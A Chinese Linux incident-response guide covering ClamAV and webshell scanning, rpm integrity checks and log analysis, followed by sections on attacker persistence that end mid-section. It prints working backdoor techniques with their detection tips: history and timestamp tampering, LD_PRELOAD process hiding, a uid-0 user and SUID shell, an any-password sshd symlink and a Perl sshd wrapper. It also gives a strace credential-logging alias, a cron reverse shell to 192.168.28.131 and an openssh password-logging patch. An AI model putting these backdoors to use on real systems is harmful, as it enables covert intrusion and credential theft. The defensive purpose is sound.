zlib-1.2.7\n  #安装一下gcc编译环境： yum install gcc\n  CFLAGS=\"-O3 -fPIC\" ./configure --prefix= /usr/local/zlib/\n  make && make install\n  \n  2、添加用户组 clamav 和组成员 clamav：\n  groupadd clamav\n  useradd -g clamav -s /bin/false -c \"Clam AntiVirus\" clamav\n  \n  3、安装 Clamav\n  tar –zxvf clamav-0.97.6.tar.gz\n  cd clamav-0.97.6\n  ./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib\n  make\n  make install\n  \n  4、配置 Clamav\n  mkdir /opt/clamav/logs\n  mkdir /opt/clamav/updata\n  touch /opt/clamav/logs/freshclam.log\n  touch /opt/clamav/logs/clamd.log\n  cd /opt/clamav/logs\n  chown clamav:clamav clamd.log\n  chown clamav:clamav freshclam.log\n  \n  5、ClamAV 使用：\n   /opt/clamav/bin/freshclam 升级病毒库\n  ./clamscan –h 查看相应的帮助信息\n  ./clamscan -r /home  扫描所有用户的主目录就使用\n  ./clamscan -r --bell -i /bin  扫描bin目录并且显示有问题的文件的扫描结果\n  ~~~\n\n  安装方式二： \n\n  ~~~\n  #安装\n  yum install -y clamav\n  #更新病毒库\n  freshclam\n  #扫描方法\n  clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log\n  clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log\n  clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log\n  #扫描并杀毒\n  clamscan -r  --remove  /usr/bin/bsd-port\n  clamscan -r  --remove  /usr/bin/\n  clamscan -r --remove  /usr/local/zabbix/sbin\n  #查看日志发现\n  cat /root/usrclamav.log |grep FOUND\n  ~~~\n\n##### 2.3 webshell查杀\n\nLinux 版：\n\n~~~\n河马 WebShell 查杀：http://www.shellpub.com\n~~~\n\n##### 2.4 RPM check 检查\n\n系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：\n\n~~~\n./rpm -Va > rpm.log\n~~~\n\n如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。\n\n~~~\n验证内容中的8个信息的具体内容如下：\n\t\tS         文件大小是否改变\n\t\tM         文件的类型或文件的权限（rwx）是否被改变\n\t\t5         文件MD5校验是否改变（可以看成文件内容是否改变）\n\t\tD         设备中，从代码是否改变\n\t\tL         文件路径是否改变\n\t\tU         文件的属主（所有者）是否改变\n\t\tG         文件的属组是否改变\n\t\tT         文件的修改时间是否改变\n~~~\n\n如果命令被替换了，如果还原回来：\n\n~~~\n文件提取还原案例：\nrpm  -qf /bin/ls  查询 ls 命令属于哪个软件包\nmv  /bin/ls /tmp  先把 ls 转移到 tmp 目录下，造成 ls 命令丢失的假象\nrpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取 rpm 包中 ls 命令到当前目录的 /bin/ls 下\ncp /root/bin/ls  /bin/ 把 ls 命令复制到 /bin/ 目录 修复文件丢失\n~~~\n\n##### 2.5 Linux安全检查脚本\n\nGithub 项目地址：\n\nhttps://github.com/grayddq/GScan\n\nhttps://github.com/ppabc/security_check\n\nhttps://github.com/T0xst/linux\n\n### Linux日志分析\n\n#### 0x00 前言\n\nLinux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 本文简介一下Linux系统日志及日志分析技巧。\n\n#### 0x01 日志简介\n\n日志默认存放位置：/var/log/\n\n查看日志配置情况：more /etc/rsyslog.conf\n\n|     日志文件     |                             说明                             |\n| :--------------: | :----------------------------------------------------------: |\n|  /var/log/cron   |                 记录了系统定时任务相关的日志                 |\n|  /var/log/cups   |                      记录打印信息的日志                      |\n|  /var/log/dmesg  | 记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息 |\n| /var/log/mailog  |                         记录邮件信息                         |\n| /var/log/message | 记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件 |\n|  /var/log/btmp   | 记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看 |\n| /var/log/lastlog | 记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看 |\n|  /var/log/wtmp   | 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看 |\n|  /var/log/utmp   | 记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询 |\n| /var/log/secure  | 记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中 |\n\n比较重要的几个日志：\n\t登录失败记录：/var/log/btmp     //lastb\n\t最后一次登录：/var/log/lastlog  //lastlog\n\t登录成功记录: /var/log/wtmp     //last\n\t登录日志记录：/var/log/secure   \n\n​\t目前登录用户信息：/var/run/utmp  //w、who、users\n\n​\t历史命令记录：history\n​\t仅清理当前用户： history -c\n\n\n#### 0x02 日志分析技巧\n\n##### A、常用的shell命令\n\nLinux下常用的shell命令如：find、grep 、egrep、awk、sed\n\n小技巧：\n\n1、grep显示前后几行信息:\n\n```\n\t标准unix/linux下的grep通过下面參数控制上下文：\n​\tgrep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行\n​\tgrep -B 5 foo file 显示foo及前5行\n​\tgrep -A 5 foo file 显示foo及后5行\n​\t查看grep版本号的方法是\n​\tgrep -V\n```\n\n2、grep 查找含有某字符串的所有文件\n\n```\n\tgrep -rn \"hello,world!\" \n\t* : 表示当前目录所有文件，也可以是某个文件名\n\t-r 是递归查找\n\t-n 是显示行号\n\t-R 查找所有文件包含子目录\n\t-i 忽略大小写\n```\n\n3、如何显示一个文件的某几行：\n\n```\n\tcat input_file | tail -n +1000 | head -n 2000\n\t#从第1000行开始，显示2000行。即显示1000~2999行\n```\n\n\n4、find /etc -name init \n\n\t//在目录/etc中查找文件init\n\n5、只是显示/etc/passwd的账户\n\n\t`cat /etc/passwd |awk  -F ':'  '{print $1}'`  \n\t//awk -F指定域分隔符为':'，将记录按指定的域分隔符划分域，填充域，​$0则表示所有域,$1表示第一个域,​$n表示第n个域。\n\n6、sed -i '153,$d' .bash_history\n\n\t删除历史操作记录，只保留前153行\n\n##### B、日志分析技巧\n\n\n**A、/var/log/secure**\n\n~~~\n1、定位有多少IP在爆破主机的root帐号：    \ngrep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more\n\n定位有哪些IP在爆破：\ngrep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c\n\n爆破用户名字典是什么？\n grep \"Failed password\" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr\n \n2、登录成功的IP有哪些： \t\ngrep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more\n\n登录成功的日期、用户名、IP：\ngrep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' \n\n3、增加一个用户kali日志：\nJul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001\nJul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali\n, shell=/bin/bash\nJul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali\n#grep \"useradd\" /var/log/secure \n\n4、删除用户kali日志：\nJul 10 00:14:17 localhost userdel[2393]: delete user 'kali'\nJul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali'\nJul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali'\n# grep \"userdel\" /var/log/secure\n\n5、su切换用户：\nJul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)\n\nsudo授权执行:\nsudo -l\nJul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now\n~~~\n\n**2、/var/log/yum.log**\n\n软件安装升级卸载日志：\n\n~~~yum install gcc\nyum install gcc\n\n[root@bogon ~]# more /var/log/yum.log\n\nJul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64\nJul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64\nJul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64\nJul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64\nJul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686\n~~~\n\n### Web日志分析\n\n#### 0x01  Web日志\n\nWeb访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。\n\n我们来看一条Apache的访问日志：\n\n`127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] \"GET /login.html HTTP/1.1\" 200 786 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36\"`\n\n通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。\n\n本文通过介绍Web日志安全分析时的思路和常用的一些技巧。\n\n#### 0x02 日志分析技巧\n\n在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。\n\n第一种：确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。\n\n第二种：攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析。\n\n常用分析工具：\n\nWindow下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。\n\nLinux下，使用Shell命令组合查询分析。\n\nShell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。\n\nApache日志分析技巧：\n\n~~~\n1、列出当天访问次数最多的IP命令：\ncut -d- -f 1 log_file|uniq -c | sort -rn | head -20\n\n2、查看当天有多少个IP访问：\nawk '{print $1}' log_file|sort|uniq|wc -l\n\n3、查看某一个页面被访问的次数：\ngrep \"/index.php\" log_file | wc -l\n\n4、查看每一个IP访问了多少个页面：\nawk '{++S[$1]} END {for (a in S) print a,S[a]}' log_file\n\n5、将每个IP访问的页面数进行从小到大排序：\nawk '{++S[$1]} END {for (a in S) print S[a],a}' log_file | sort -n\n\n6、查看某一个IP访问了哪些页面：\ngrep ^111.111.111.111 log_file| awk '{print $1,$7}'\n\n7、去掉搜索引擎统计当天的页面：\nawk '{print $12,$1}' log_file | grep ^\\\"Mozilla | awk '{print $2}' |sort | uniq | wc -l\n\n8、查看2018年6月21日14时这一个小时内有多少IP访问:\nawk '{print $4,$1}' log_file | grep 21/Jun/2018:14 | awk '{print $2}'| sort | uniq | wc -l\t\n~~~\n\n#### 0x03 日志分析案例\n\nWeb日志分析实例：通过nginx代理转发到内网某服务器，内网服务器某站点目录下被上传了多个图片木马，虽然II7下不能解析，但还是想找出谁通过什么路径上传的。\n\n在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？\n\n这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。\n\n1、定位攻击源\n\n首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理IP，并不能通过IP来还原攻击路径，这时候，可以利用浏览器指纹来定位。\n\n![](应急响应-Linux篇/log-3-1.png)\n\n浏览器指纹：\n\n`Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)`\n\n2、搜索相关日志记录\n\n通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径。\n\n![](应急响应-Linux篇/log-3-2.png)\n\n3、对找到的访问日志进行解读，攻击者大致的访问路径如下：\n\n~~~\nA、攻击者访问首页和登录页\nB、攻击者访问MsgSjlb.aspx和MsgSebd.aspx\nC、攻击者访问Xzuser.aspx\nD、攻击者多次POST（怀疑通过这个页面上传模块缺陷）\nE、攻击者访问了图片木马\n~~~\n\n打开网站，访问Xzuser.aspx，确认攻击者通过该页面的进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。\n\n#### 0x04 日志统计分析技巧\t\t\n\n统计爬虫：\n\n```javascript\ngrep -E 'Googlebot|Baiduspider'  /www/logs/access.2019-02-23.log | awk '{ print $1 }' | sort | uniq\n```\n\n统计浏览器：\n\n```javascript\ncat /www/logs/access.2019-02-23.log | grep -v -E 'MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon' | sort | uniq -c | sort -r -n | head -n 100\t\t\n```\n\nIP 统计：\n\n```javascript\ngrep '23/May/2019' /www/logs/access.2019-02-23.log | awk '{print $1}' | awk -F'.' '{print $1\".\"$2\".\"$3\".\"$4}' | sort | uniq -c | sort -r -n | head -n 10\n   2206 219.136.134.13\n   1497 182.34.15.248\n   1431 211.140.143.100\n   1431 119.145.149.106\n   1427 61.183.15.179\n   1427 218.6.8.189\n   1422 124.232.150.171\n   1421 106.187.47.224\n   1420 61.160.220.252\n   1418 114.80.201.18\t\t\t\n```\n\n统计网段：\n\n```javascript\ncat /www/logs/access.2019-02-23.log | awk '{print $1}' | awk -F'.' '{print $1\".\"$2\".\"$3\".0\"}' | sort | uniq -c | sort -r -n | head -n 200\t\t\t\n```\n\n统计域名：\n\n```javascript\ncat  /www/logs/access.2019-02-23.log |awk '{print $2}'|sort|uniq -c|sort -rn|more\t\t\n```\n\nHTTP Status：\n\n```javascript\ncat  /www/logs/access.2019-02-23.log |awk '{print $9}'|sort|uniq -c|sort -rn|more\n5056585 304\n1125579 200\n   7602 400\n      5 301\t\n```\n\nURL 统计：\n\n```javascript\ncat  /www/logs/access.2019-02-23.log |awk '{print $7}'|sort|uniq -c|sort -rn|more\t\t\t\n```\n\n文件流量统计：\n\n```javascript\ncat /www/logs/access.2019-02-23.log |awk '{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'|sort -rn|more\n\ngrep ' 200 ' /www/logs/access.2019-02-23.log |awk '{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'|sort -rn|more\t\t\t\n```\n\nURL访问量统计：\n\n```javascript\ncat /www/logs/access.2019-02-23.log | awk '{print $7}' | egrep '\\?|&' | sort | uniq -c | sort -rn | more\t\t\t\n```\n\n脚本运行速度：\n\n查出运行速度最慢的脚本\n\n```javascript\ngrep -v 0$ /www/logs/access.2019-02-23.log | awk -F '\\\" ' '{print $4\" \" $1}' web.log | awk '{print $1\" \"$8}' | sort -n -k 1 -r | uniq > /tmp/slow_url.txt\t\t\t\n```\n\nIP, URL 抽取：\n\n```javascript\n# tail -f /www/logs/access.2019-02-23.log | grep '/test.html' | awk '{print $1\" \"$7}'\t\t\t\n```\n\n### Linux权限维持--隐藏篇\n\n#### 0x00 前言\n\n攻击者在获取服务器权限后，会通过一些技巧来隐藏自己的踪迹和后门文件，本文介绍Linux下的几种隐藏技术。\n\n#### 0x01 隐藏文件\n\n\nLinux 下创建一个隐藏文件：`touch  .test.txt`  \n\ntouch 命令可以创建一个文件，文件名前面加一个 点 就代表是隐藏文件,如下图：\n\n![](应急响应-Linux篇/privilege-2-1.png)\n\n一般的Linux下的隐藏目录使用命令`ls -l`是查看不出来的，只能查看到文件及文件夹，查看Linux下的隐藏文件需要用到命令：`ls -al`\n\n这里，我们可以看到在/tmp下，默认存在多个隐藏目录，这些目录是恶意文件常用来藏身的地方。如`/temp/.ICE-unix/、/temp/.Test-unix/、/temp/.X11-unix/、/temp/.XIM-unix/`\n\n#### 0x02 隐藏文件时间戳\n\nUnix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。\n\n比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。\n\n利用方法\n\ntouch -r index.php webshell.php\n\n或者直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。\n\ntouch -t 1401021042.30 webshell.php\n\n#### 0x03 隐藏权限\n\n在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。\n\n这个技巧常被用在后门，变成了一些难以清除的后门文件，令很多新手朋友感到头疼。\n\n~~~\nchattr +i evil.php 锁定文件\nlsattr  evil.php   属性查看\nchattr -i evil.php 解除锁定\nrm -rf 1.evil.php  删除文件\n~~~\n\n![](应急响应-Linux篇/privilege-2-2.png)\n\n#### 0x04 隐藏历史操作命令\n\n在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？\n\n技巧一：只针对你的工作关闭历史记录\n\n~~~\n[space]set +o history\n备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。\n~~~\n\n上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。\n\n要重新开启历史功能，执行下面的命令：\n\n~~~\n[Space]set -o history\n它将环境恢复原状，也就是你完成了你的工作，执行上述命令之后的命令都会出现在历史中。\n~~~\n\n技巧二：从历史记录中删除指定的命令\n\n假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命令来删除：\n\n~~~\nhistory | grep \"keyword\"\n~~~\n\n输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：\n\n```\nhistory -d [num]\n```\n\n![](应急响应-Linux篇/privilege-2-3.png)\n\n这种技巧是关键记录删除，或者我们可以暴力点，比如前150行是用户的正常操作记录，150以后是攻击者操作记录。我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前150行：\n\n~~~\nsed -i '150,$d' .bash_history\n~~~\n\n#### 0x05 隐藏远程SSH登陆记录\n\n#隐身登录系统，不会被w、who、last等指令检测到。\n\n~~~\nssh -T root@127.0.0.1 /bin/bash -i\n~~~\n\n不记录ssh公钥在本地.ssh目录中\n\n```\nssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i\n```\n\n\n\n#### 0x06 端口复用\n\n通过端口复用来达到隐藏端口的目的，在Linux下，如何实现端口复用呢？\n\n第一种方式：通过SSLH在同一端口上共享SSH与HTTPS\n\n~~~\n #安装SSLH\n sudo apt-get install sslh\n #配置SSLH\n 编辑 SSLH 配置文件：\n sudo vi /etc/default/sslh\n 1、找到下列行：Run=no  将其修改为：Run=yes\n 2、修改以下行以允许 SSLH 在所有可用接口上侦听端口 443\n DAEMON_OPTS=\"--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid\"\n~~~\n\n第二种方式：利用IPTables进行端口复用\n\n~~~\n# 端口复用链\niptables -t nat -N LETMEIN\n# 端口复用规则\niptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22\n# 开启开关\niptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT\n# 关闭开关\niptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT\n# let's do it\niptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN\n~~~\n\n利用方式：\n\n~~~\n#开启复用\necho threathuntercoming | socat - tcp:192.168.28.128:80\n#ssh使用80端口进行登录\nssh -p 80 root@192.168.28.128\n#关闭复用\necho threathunterleaving | socat - tcp:192.168.28.128:80\n~~~\n\n![](应急响应-Linux篇/privilege-2-4.png)\n\n 具体文章详见：[远程遥控 IPTables 进行端口复用](https://www.freebuf.com/articles/network/137683.html)\n\n#### 0x07 进程隐藏\n\n管理员无法通过相关命令工具查找到你运行的进程，从而达到隐藏目的，实现进程隐藏。\n\n第一种方法：libprocesshider\n\ngithub项目地址：https://github.com/gianlucaborello/libprocesshider\n\n利用 LD_PRELOAD 来实现系统函数的劫持，实现如下\n\n~~~\n# 下载程序编译\ngit clone https://github.com/gianlucaborello/libprocesshider.git\ncd libprocesshider/ && make\n# 移动文件到/usr/local/lib/目录下\ncp libprocesshider.so /usr/local/lib/\n# 把它加载到全局动态连接局\necho /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload\n~~~\n\n测试：运行 evil_script.py，\n\n![](应急响应-Linux篇/privilege-2-5.png)\n\n此时发现在top 与 ps 中都无法找到 evil_script.py， cpu 使用率高,但是却找不到任何占用cpu高的程序。\n\n![](应急响应-Linux篇/privilege-2-6.png)\n\n如何在Linux中发现隐藏的进程，\n\n`unhide` 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP / UDP端口。这个工具在Linux，UNIX类，MS-Windows等操作系统下都可以工作。\n\n下载地址：http://www.unhide-forensics.info/\n\n~~~\n# 安装\nsudo yum install unhide\n# 使用\nunhide [options] test_list\n~~~\n\n使用`unhide proc`发现隐藏进程evil_script.py，如下图所示：\n\n![](应急响应-Linux篇/privilege-2-7.png)\n\n第二种方法：进程注入工具linux-inject\n\nlinux-inject是用于将共享对象注入Linux进程的工具\n\ngithub项目地址： https://github.com/gaffe23/linux-inject.git\n\n~~~\n# 下载程序编译\ngit clone https://github.com/gaffe23/linux-inject.git\ncd linux-inject && make\n# 测试进程\n./sample-target\n# 进程注入\n./inject -n sample-target sample-library.so\n~~~\n\n验证进程注入成功，如下图所示：\n\n![](应急响应-Linux篇/privilege-2-8.png)\n\n\n\nCymothoa是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限。该工具最大的优点就是不创建新的进程，不容易被发现。\n\n下载地址：https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/\n\n~~~\n# 下载解压\nwget https://jaist.dl.sourceforge.net/project/cymothoa/cymothoa-1-beta/cymothoa-1-beta.tar.gz\ntar zxvf cymothoa-1-beta.tar.gz \n# \ncd cymothoa-1-beta && make\n\n\n~~~\n\n### Linux权限维持--后门篇\n\n本文将对Linux下常见的权限维持技术进行解析，知己知彼百战不殆。\n\n#### **1、一句话添加用户和密码**\n\n添加普通用户：\n\n```\n# 创建一个用户名guest，密码123456的普通用户\nuseradd -p `openssl passwd -1 -salt 'salt' 123456` guest\n\n# useradd -p 方法  ` ` 是用来存放可执行的系统命令,\"$()\"也可以存放命令执行语句\nuseradd -p \"$(openssl passwd -1 123456)\" guest\n\t\n# chpasswd方法\nuseradd guest;echo 'guest:123456'|chpasswd\n\t\n# echo -e方法\nuseradd test;echo -e \"123456\\n123456\\n\" |passwd test\n```\n\n添加root用户：\n\n```\n# 创建一个用户名guest，密码123456的root用户\nuseradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test\n```\n\n可疑用户排查技巧：\n\n```\n# 查询特权用户特权用户(uid 为0)\n[root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd\n# 查询可以远程登录的帐号信息\n[root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow\n# 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限\n[root@localhost ~]# more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\"\n```\n\n#### **2、SUID Shell**\n\nSuid shell是一种可用于以拥有者权限运行的shell。\n\n```\n配合普通用户权限使用\ncp /bin/bash /tmp/shell\nchmod u+s /tmp/shell\n```\n\n使用guest用户登录就可疑获取root权限。\n\n![](应急响应-Linux篇/privilege-5-1.png)\n\n备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。\n\n排查技巧：\n\n```\n# 在Linux中查找SUID设置的文件\nfind . -perm /4000 \n# 在Linux中查找使用SGID设置的文件\nfind . -perm /2000\n# 取消s权限\nchmod u-s /tmp/shell\n```\n\n\n\n#### **3、ssh公私钥免密登录**\n\n在客户端上生成一对公私钥，然后把公钥放到服务器上（~/.ssh/authorized_keys），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配。如果匹配成功就可以登录了。\n\n客户端：\n\n```\nssh-keygen -t rsa\n```\n\n过程中按三次回车，执行结束如下图:\n\n![](应急响应-Linux篇/privilege-5-2.png)\n\n进入/root/.ssh/文件夹，查看文件夹的内容，如下所示：\n\n![](应急响应-Linux篇/privilege-5-3.png)\n\n其中 `id_rsa`为私钥，`id_rsa.pub`为公钥，接下来打开`id_rsa.pub`，将内容复制到服务器。将`id_rsa.pub`的内容追加到`/root/.ssh/authorized_keys`内，配置完成。\n\n排查技巧：查看`/root/.ssh/authorized_keys`是否被修改。\n\n\n\n#### **4、软连接**\n\n在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 `/tmp/su` 在`/etc/pam.d/`目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)，任意密码登陆的核心是`auth sufficient pam_rootok.so`，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。\n\n在目标服务器上执行一句话后门：\n\n```\nln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888\n```\n\n执行完之后，任何一台机器`ssh root@IP -p 8888`，输入任意密码，成功登录。\n\n![](应急响应-Linux篇/privilege-5-4.png)\n\n排查技巧：进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。\n\n![](应急响应-Linux篇/privilege-5-4-1.png)\n\n\n\n#### **5、SSH wrapper**\n\n首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell\n\n简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。\n\n服务端：\n\n```\ncd /usr/sbin/\nmv sshd ../bin/\necho '#!/usr/bin/perl' >sshd\necho 'exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..4A/);' >>sshd\necho 'exec{\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV,' >>sshd\nchmod u+x sshd\n/etc/init.d/sshd restart\n```\n\n客户端：\n\n```\nsocat STDIO TCP4:target_ip:22,sourceport=13377\n\n#如果你想修改源端口，可以用python的struct标准库实现。其中x00x00LF是19526的大端形式，便于传输和处理。\n>>> import struct\n>>> buffer = struct.pack('>I6',19526)\n>>> print repr(buffer)\n'\\x00\\x00LF'\n>>> buffer = struct.pack('>I6',13377)\n>>> print buffer\n4A\n```\n\n![](应急响应-Linux篇/privilege-5-5.png)\n\n排查技巧：\n\n```\n# ls -al /usr/sbin/sshd\n# cat /usr/sbin/sshd\n可通过重装ssh服务恢复。\n```\n\n\n\n#### **6、strace后门**\n\n通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。\n\n```\n#vim /etc/bashrc\nalias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh'\n# source /root/.bashrc\n```\n\n![](应急响应-Linux篇/privilege-5-5-1.png)\n\n排查技巧：使用`alias`即可发现异常。\n\n![](应急响应-Linux篇/privilege-5-5-2.png)\n\n#### **7、crontab反弹shell**\n\ncrontab命令用于设置周期性被执行的指令。新建shell脚本，利用脚本进行反弹。\n\na、创建shell脚本，例如在/etc/evil.sh\n\n```\n#!/bin/bash\nbash -i >& /dev/tcp/192.168.28.131/12345  0>&1\n```\n\n`chmod +sx /etc/evil.sh`\n\nb、crontab -e 设置定时任务\n\n```\n#每一分钟执行一次\n*/1 * * * * root /etc/evil.sh\n```\n\n重启crond服务，`service crond restart`，然后就可以用nc接收shell。\n\n![](应急响应-Linux篇/privilege-5-6.png)\n\n排查技巧：\n\n```\n# 查看可疑的定时任务列表\ncrontab -e\n```\n\n\n\n#### **8、openssh后门**\n\n利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。\n\n~~~\na、备份SSH配置文件\nmv /etc/ssh/ssh_config /etc/ssh/ssh_config.old\nmv /etc/ssh/sshd_config /etc/ssh/sshd_config.old\n\nb、解压并安装补丁\ntar zxf openssh-5.9p1.tar.gz\ntar zxf openssh-5.9p1.tar.gz\ncp openssh-5.9p1.patch/sshbd5.9p1.diff  /openssh-5.9p1\ncd openssh-5.9p1\npatch < sshbd5.9p1.diff\n\nc、记录用户名和密码的文件位置及其密码\nvi  includes.h\n\t#define ILOG \"/tmp/1.txt\"             //记录登录本机的用户名和密码\n\t#define OLOG \"/tmp/2.txt\"             